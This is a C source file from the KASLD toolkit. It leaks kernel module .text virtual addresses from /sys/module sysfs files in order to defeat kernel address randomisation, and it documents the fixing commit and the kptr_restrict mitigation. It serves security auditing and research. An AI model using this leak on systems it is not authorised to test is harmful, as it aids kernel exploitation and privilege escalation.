// This file is part of KASLD - https://github.com/bcoles/kasld
//
// Retrieve virtual address for loadable kernel modules from
// /sys/module/*/sections/.text
//
// Kernel module section offsets were exposed world-readable in SysFS from 2004.
// Permissions were modified to prevent access (unless `kptr_restrict = 0`) in
// kernel 4.15-rc1 on 2017-11-12:
// https://github.com/torvalds/linux/commit/277642dcca765a1955d4c753a5a315ff7f2eb09d
//
// Leak primitive:
//   Data leaked:      kernel module section virtual addresses (.text, etc.)
//   Kernel subsystem: kernel/module — /sys/module/*/sections/.text
//   Data structure:   struct module_sect_attr → address
//   Address type:     virtual (kernel module text)
//   Method:           exact (sysfs file read)
//   Patched:          v4.15 (commit 277642dcca76; permissions restricted)
//   Status:           gated since v4.15 (kptr_restrict)
//   Access check:     module_sect_show() checks kptr_restrict since v4.15;
//                     requires CAP_SYSLOG
//   Source:
//   https://elixir.bootlin.com/linux/v6.12/source/kernel/module/sysfs.c
//
// Mitigations:
//   Since v4.15, section files require kptr_restrict = 0 (or CAP_SYSLOG)
//   to read addresses. Before v4.15, world-readable (0444).
// ---
// <bcoles@gmail.com>

#define _GNU_SOURCE
#include "include/kasld/api.h"
#include <dirent.h>
#include <errno.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>

KASLD_EXPLAIN(
    "Reads kernel module section addresses from "
    "/sys/module/*/sections/.text. Each loaded module exposes its .text "
    "virtual address. Since v4.15, these files are filtered through "
    "kptr_restrict (requiring kptr_restrict=0 or CAP_SYSLOG). Module "
    "addresses constrain the modules region and, on coupled "
    "architectures, the kernel text base.");

KASLD_META("method:parsed\n"
           "phase:inference\n"
           "addr:virtual\n"
           "sysctl:kptr_restrict>=1\n"
           "bypass:CAP_SYSLOG\n"
           "patch:v4.15\n");

static unsigned long read_module_text(char *path) {
  FILE *f;
  char *endptr;
  /* Fixed 64-byte cookie line — one hex address plus "\n". Constant-sized
   * to keep -Wvla / -Wstack-protector silent (no runtime-sized stack). */
  enum { buff_len = 64 };
  char buff[buff_len];
  const int addr_len = sizeof(long *) * 2;
  unsigned long addr = 0;

  // printf("[.] checking %s ...\n", path);

  f = kasld_fopen(path, "rb");
  if (f == NULL)
    return 0;

  if (fgets(buff, buff_len, f) == NULL) {
    fclose(f);
    return 0;
  }

  fclose(f);

  // pointer hex string length + "0x" prefix + "\n" line feed
  if (strlen(buff) != (size_t)(addr_len + 3))
    return 0;

  addr = strtoul(buff, &endptr, 16);

  if (addr && kasld_addr_is_module_region(addr))
    return addr;

  return 0;
}

#define module_range addr_range

static struct module_range get_module_text_sysfs(void) {
  char d_path[1024];
  unsigned long text_addr = 0;
  const char *path = "/sys/module/";
  struct dirent *dir;
  DIR *d;
  struct module_range range = {0, 0};

  printf("[.] trying /sys/modules/*/sections/.text ...\n");

  d = opendir(path);
  if (d == NULL) {
    perror("[-] opendir");
    return range;
  }

  while ((dir = readdir(d)) != NULL) {
    if (dir->d_type != DT_DIR)
      continue;

    snprintf(d_path, sizeof(d_path), "%s%s/sections/.text", path, dir->d_name);
    text_addr = read_module_text(d_path);

    if (!text_addr)
      continue;

    if (!range.lo || text_addr < range.lo)
      range.lo = text_addr;
    if (text_addr > range.hi)
      range.hi = text_addr;
  }

  closedir(d);

  return range;
}

int main(void) {
  /* Pre-check: can we access /sys/module/? */
  if (kasld_access("/sys/module/", R_OK) != 0)
    return (errno == EACCES || errno == EPERM) ? KASLD_EXIT_NOPERM
                                               : KASLD_EXIT_UNAVAILABLE;

  struct module_range range = get_module_text_sysfs();
  if (!range.lo) {
    printf("[-] no kernel address found in /sys/module sections\n");
    return 0;
  }

  printf("lowest leaked module text address:  %lx\n", range.lo);
  if (range.hi != range.lo) {
    printf("highest leaked module text address: %lx\n", range.hi);
    /* Pair of base+top samples for the same MODULE region: the merge pass
     * will combine them into a full extent. */
    kasld_result_range(KASLD_TYPE_VIRT, REGION_MODULE_REGION, range.lo,
                       range.hi, NULL, CONF_PARSED);
  } else {
    kasld_result_sample(KASLD_TYPE_VIRT, REGION_MODULE_REGION, range.lo, NULL,
                        CONF_PARSED);
  }

  return 0;
}
